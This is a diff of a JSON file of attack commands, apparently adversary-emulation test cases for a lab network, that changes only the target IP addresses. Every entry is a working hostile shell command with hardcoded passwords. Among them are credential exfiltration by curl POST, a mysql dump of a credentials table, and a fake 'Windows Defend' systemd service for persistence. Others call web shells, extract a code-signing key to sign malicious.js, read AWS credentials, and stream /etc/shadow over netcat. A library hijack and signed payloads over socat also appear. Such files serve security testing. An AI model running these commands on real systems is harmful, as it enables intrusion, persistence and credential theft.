@@ -10,7 +10,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "rm -rf /root/.ssh/known_hosts && curl -X POST -H \"Content-Type: application/json\" -d '{\"key\":\"session1\",\"val\":\"stolen_credentials_or_commands\"}' http://172.21.0.20:8080/store && curl http://172.21.0.20:8080/fetch/session1"
+        "command": "rm -rf /root/.ssh/known_hosts && curl -X POST -H \"Content-Type: application/json\" -d '{\"key\":\"session1\",\"val\":\"stolen_credentials_or_commands\"}' http://192.168.20.30:8080/store && curl http://192.168.20.30:8080/fetch/session1"
       }
     ]
   },
@@ -25,7 +25,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "mysql -h 172.21.0.20 -u attacker -pAttack3rPass -e \"SELECT * FROM sensitive_data.credentials;\""
+        "command": "mysql -h 192.168.20.30 -u attacker -pAttack3rPass -e \"SELECT * FROM sensitive_data.credentials;\""
       }
     ]
   },
@@ -40,7 +40,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": " printf \"[Unit]\nDescription=Windows Defend Service\n[Service]\nExecStart=/srv/samba/share/WindowsDefend.sh\nRestart=always\n[Install]\nWantedBy=multi-user.target\n\" > WindowsDefend.service && smbclient //172.21.0.20/share -U DebianUser%DebianUser -c 'put /bin/bash WindowsDefend.sh' && smbclient //172.21.0.20/share -U DebianUser%DebianUser -c 'put WindowsDefend.service' && sshpass -p 'DebianUser' ssh -o StrictHostKeyChecking=no DebianUser@172.21.0.20 'nohup /srv/samba/share/WindowsDefend.sh &'"
+        "command": " printf \"[Unit]\nDescription=Windows Defend Service\n[Service]\nExecStart=/srv/samba/share/WindowsDefend.sh\nRestart=always\n[Install]\nWantedBy=multi-user.target\n\" > WindowsDefend.service && smbclient //192.168.20.30/share -U DebianUser%DebianUser -c 'put /bin/bash WindowsDefend.sh' && smbclient //192.168.20.30/share -U DebianUser%DebianUser -c 'put WindowsDefend.service' && sshpass -p 'DebianUser' ssh -o StrictHostKeyChecking=no DebianUser@192.168.20.30 'nohup /srv/samba/share/WindowsDefend.sh &'"
       }
     ]
   },
@@ -55,7 +55,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no  attacker@172.21.0.20 'echo maliciousfile > /tmp/malware.txt && rm -f /tmp/malware.txt'"
+        "command": "sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no  attacker@192.168.20.30 'echo maliciousfile > /tmp/malware.txt && rm -f /tmp/malware.txt'"
       }
     ]
   },
@@ -70,7 +70,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'sshpass -p 'RootPass123' scp -o StrictHostKeyChecking=no root@172.22.0.20:/tmp/toolfile /tmp/toolfile' &&  sshpass -p 'RootPass123' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@172.21.0.20:/tmp/toolfile /tmp/toolfile"
+        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 'sshpass -p 'RootPass123' scp -o StrictHostKeyChecking=no root@192.168.30.40:/tmp/toolfile /tmp/toolfile' &&  sshpass -p 'RootPass123' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@192.168.20.30:/tmp/toolfile /tmp/toolfile"
       }
     ]
   },
@@ -85,7 +85,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "curl \"http://172.21.0.20/shell.php?cmd=id\""
+        "command": "curl \"http://192.168.20.30/shell.php?cmd=id\""
       }
     ]
   },
@@ -100,7 +100,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "curl http://172.21.0.20/server-status.php"
+        "command": "curl http://192.168.20.30/server-status.php"
       }
     ]
   },
@@ -115,7 +115,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "wget http://172.21.0.20/root/certs/code_signing.pfx -O code_signing.pfx && openssl pkcs12 -in code_signing.pfx -nocerts -nodes -passin pass:password123 -out code_signing.key && openssl pkcs12 -in code_signing.pfx -clcerts -nokeys -passin pass:password123 -out code_signing.crt && echo 'console.log(\"Malicious signed code executed\");' > malicious.js && openssl dgst -sha256 -sign code_signing.key -out malicious.js.sig malicious.js && cat malicious.js"
+        "command": "wget http://192.168.20.30/root/certs/code_signing.pfx -O code_signing.pfx && openssl pkcs12 -in code_signing.pfx -nocerts -nodes -passin pass:password123 -out code_signing.key && openssl pkcs12 -in code_signing.pfx -clcerts -nokeys -passin pass:password123 -out code_signing.crt && echo 'console.log(\"Malicious signed code executed\");' > malicious.js && openssl dgst -sha256 -sign code_signing.key -out malicious.js.sig malicious.js && cat malicious.js"
       }
     ]
   },
@@ -130,7 +130,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p 'Passw0rd' ssh attacker@172.21.0.20 \"cat ~/.aws/credentials\" && echo \"aws s3 ls not available on lab!\""
+        "command": "sshpass -p 'Passw0rd' ssh attacker@192.168.20.30 \"cat ~/.aws/credentials\" && echo \"aws s3 ls not available on lab!\""
       }
     ]
   },
@@ -145,7 +145,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "curl http://172.21.0.20/crm.php -s --fail --retry 3"
+        "command": "curl http://192.168.20.30/crm.php -s --fail --retry 3"
       }
     ]
   },
@@ -160,7 +160,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p 'Passw0rd' ssh attacker@172.21.0.20 \"echo HELLO_LAB | python3 /home/attacker/reverse.py\""
+        "command": "sshpass -p 'Passw0rd' ssh attacker@192.168.20.30 \"echo HELLO_LAB | python3 /home/attacker/reverse.py\""
       }
     ]
   },
@@ -175,7 +175,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "echo \"cat /etc/passwd | tee -a /tmp/staged_data.csv\" | nc -w 2 172.21.0.20 4444 && echo \"cat /etc/shadow | tee -a /tmp/staged_data.csv\" | nc -w 2 172.21.0.20 4444 && echo \"cat /tmp/staged_data.csv\" | nc -w 2 172.21.0.20 4444 | tee -a /tmp/staged_data.csv"
+        "command": "echo \"cat /etc/passwd | tee -a /tmp/staged_data.csv\" | nc -w 2 192.168.20.30 4444 && echo \"cat /etc/shadow | tee -a /tmp/staged_data.csv\" | nc -w 2 192.168.20.30 4444 && echo \"cat /tmp/staged_data.csv\" | nc -w 2 192.168.20.30 4444 | tee -a /tmp/staged_data.csv"
       }
     ]
   },
@@ -205,7 +205,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p 'BackupPass123' ssh -o StrictHostKeyChecking=no backupsvc@172.21.0.20 \"nohup /usr/local/bin/systemd-update </dev/null >/dev/null 2>&1 &\""
+        "command": "sshpass -p 'BackupPass123' ssh -o StrictHostKeyChecking=no backupsvc@192.168.20.30 \"nohup /usr/local/bin/systemd-update </dev/null >/dev/null 2>&1 &\""
       }
     ]
   },
@@ -220,7 +220,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "whatweb -a 3 172.21.0.20"
+        "command": "whatweb -a 3 192.168.20.30"
       }
     ]
   },
@@ -235,7 +235,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 'mkdir -p /home/attacker/malicious /home/attacker/vulnerable_app && cd /home/attacker/malicious && printf \"#include <stdlib.h>\\nvoid hello(){ system(\\\"id > /tmp/hijack_result.txt\\\"); }\\n\" > hijack.c && gcc -shared -fPIC -o liblegit.so hijack.c && mv liblegit.so /home/attacker/vulnerable_app/liblegit.so && printf \"#include <stdio.h>\\nvoid hello();\\nint main(){ hello(); return 0; }\\n\" > /home/attacker/vulnerable_app/vulnapp.c && gcc /home/attacker/vulnerable_app/vulnapp.c -L/home/attacker/vulnerable_app -llegit -o /home/attacker/vulnerable_app/vulnapp && LD_LIBRARY_PATH=/home/attacker/vulnerable_app /home/attacker/vulnerable_app/vulnapp && cat /tmp/hijack_result.txt'"
+        "command": "sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@192.168.20.30 'mkdir -p /home/attacker/malicious /home/attacker/vulnerable_app && cd /home/attacker/malicious && printf \"#include <stdlib.h>\\nvoid hello(){ system(\\\"id > /tmp/hijack_result.txt\\\"); }\\n\" > hijack.c && gcc -shared -fPIC -o liblegit.so hijack.c && mv liblegit.so /home/attacker/vulnerable_app/liblegit.so && printf \"#include <stdio.h>\\nvoid hello();\\nint main(){ hello(); return 0; }\\n\" > /home/attacker/vulnerable_app/vulnapp.c && gcc /home/attacker/vulnerable_app/vulnapp.c -L/home/attacker/vulnerable_app -llegit -o /home/attacker/vulnerable_app/vulnapp && LD_LIBRARY_PATH=/home/attacker/vulnerable_app /home/attacker/vulnerable_app/vulnapp && cat /tmp/hijack_result.txt'"
       }
     ]
   },
@@ -250,7 +250,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "curl -X POST -d \"cmd=touch /tmp/owned_by_attack\" http://172.21.0.20:8081/exec"
+        "command": "curl -X POST -d \"cmd=touch /tmp/owned_by_attack\" http://192.168.20.30:8081/exec"
       }
     ]
   },
@@ -265,7 +265,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 'rar a /tmp/collected_data.rar /var/log/*.log' && sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 'sshpass -p 'Passw0rd' scp -o StrictHostKeyChecking=no /tmp/collected_data.rar attacker@172.22.0.20:/tmp/'"
+        "command": "sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@192.168.20.30 'rar a /tmp/collected_data.rar /var/log/*.log' && sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@192.168.20.30 'sshpass -p 'Passw0rd' scp -o StrictHostKeyChecking=no /tmp/collected_data.rar attacker@192.168.30.40:/tmp/'"
       }
     ]
   },
@@ -280,7 +280,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "curl -k -X POST https://172.21.0.20:443/cmd -H \"Content-Type: application/json\" -d '{\"command\":\"id\"}'"
+        "command": "curl -k -X POST https://192.168.20.30:443/cmd -H \"Content-Type: application/json\" -d '{\"command\":\"id\"}'"
       }
     ]
   },
@@ -295,7 +295,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "curl http://172.21.0.20/robots.txt && curl http://172.21.0.20/secret/index.html"
+        "command": "curl http://192.168.20.30/robots.txt && curl http://192.168.20.30/secret/index.html"
       }
     ]
   },
@@ -310,7 +310,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "curl -X POST --data 'id' http://172.21.0.20:8082  && curl -X POST --data 'ifconfig' http://172.21.0.20:8082"
+        "command": "curl -X POST --data 'id' http://192.168.20.30:8082  && curl -X POST --data 'ifconfig' http://192.168.20.30:8082"
       }
     ]
   },
@@ -325,7 +325,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo \"ls -la\" | openssl pkeyutl -encrypt -pubin -inkey /root/public_key.pem -out /root/encrypted_command.bin && /root/decrypt_and_execute.sh && cat /root/decrypted_command.txt'"
+        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 'echo \"ls -la\" | openssl pkeyutl -encrypt -pubin -inkey /root/public_key.pem -out /root/encrypted_command.bin && /root/decrypt_and_execute.sh && cat /root/decrypted_command.txt'"
       }
     ]
   },
@@ -340,7 +340,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 \"echo 'echo Malicious_signed_payload_executed' | openssl pkeyutl -sign -inkey /root/code_signing_key.pem | socat - TCP:172.21.0.20:4445 && echo Payload_sent\""
+        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@192.168.20.30 \"echo 'echo Malicious_signed_payload_executed' | openssl pkeyutl -sign -inkey /root/code_signing_key.pem | socat - TCP:192.168.20.30:4445 && echo Payload_sent\""
       }
     ]
   },
